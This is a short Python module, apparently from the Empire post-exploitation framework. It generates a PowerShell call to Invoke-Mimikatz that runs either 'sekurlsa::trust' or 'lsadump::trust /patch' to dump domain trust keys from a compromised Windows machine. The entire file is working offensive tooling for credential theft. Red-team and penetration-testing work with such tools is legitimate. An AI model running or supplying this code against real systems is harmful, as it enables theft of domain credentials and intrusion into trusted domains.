from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):

        script_end = ""
        if params["Method"].lower() == "sekurlsa":
            script_end += "Invoke-Mimikatz -Command '\"sekurlsa::trust\"'"
        else:
            script_end += "Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'"

        return script, script_end
